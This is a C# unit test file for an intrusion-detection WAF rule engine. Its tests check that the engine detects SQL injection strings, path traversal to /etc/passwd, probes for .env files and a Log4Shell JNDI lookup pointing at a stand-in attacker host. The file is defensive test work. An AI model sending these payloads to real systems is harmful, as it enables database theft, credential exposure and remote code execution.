using System;
using IDDSCommunity.IntrusionDetection.Shared.WebSecurity;
using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace IDDSCommunity.IntrusionDetection.Shared.Test;

/// <summary>
/// 驗證 WafRuleEngine 輕量級應用層 WAF 特徵比對。
/// </summary>
[TestClass]
public sealed class WafRuleEngineTest
{
    /// <summary>
    /// 驗證 SQL Injection 攻擊特徵比對。
    /// </summary>
    [TestMethod]
    public void TryMatchThreat_SqlInjection_Detected()
    {
        string[] payloads =
        [
            "/login?user=admin' OR '1'='1",
            "/search?q=1 UNION SELECT null, username, password FROM users",
            "/api?id=1; WAITFOR DELAY '0:0:5'",
            "/vuln?id=1 AND SLEEP(5)"
        ];

        foreach (string payload in payloads)
        {
            bool matched = WafRuleEngine.TryMatchThreat(payload, out string? category);
            Assert.IsTrue(matched, $"Failed for payload: {payload}");
            Assert.AreEqual("SQL.Injection", category);
        }
    }

    /// <summary>
    /// 驗證 Path Traversal 與敏感檔案探測特徵比對。
    /// </summary>
    [TestMethod]
    public void TryMatchThreat_PathTraversalAndSensitiveFiles_Detected()
    {
        Assert.IsTrue(WafRuleEngine.TryMatchThreat("/download?file=../../etc/passwd", out string? cat1));
        Assert.AreEqual("Path.Traversal", cat1);

        Assert.IsTrue(WafRuleEngine.TryMatchThreat("/app/.env", out string? cat2));
        Assert.AreEqual("Sensitive.File.Probe", cat2);
    }

    /// <summary>
    /// 驗證 Log4Shell / RCE 特徵比對。
    /// </summary>
    [TestMethod]
    public void TryMatchThreat_Log4ShellRce_Detected()
    {
        Assert.IsTrue(WafRuleEngine.TryMatchThreat("${jndi:ldap://evil.attacker.com/exploit}", out string? cat));
        Assert.AreEqual("RCE.Log4Shell.Or.Spring4Shell", cat);
    }

    /// <summary>
    /// 驗證正常請求不會誤判。
    /// </summary>
    [TestMethod]
    public void TryMatchThreat_NormalRequests_NotDetected()
    {
        Assert.IsFalse(WafRuleEngine.TryMatchThreat("/index.html", out _));
        Assert.IsFalse(WafRuleEngine.TryMatchThreat("/api/v1/products?category=electronics&page=2", out _));
        Assert.IsFalse(WafRuleEngine.TryMatchThreat(null, out _));
    }
}
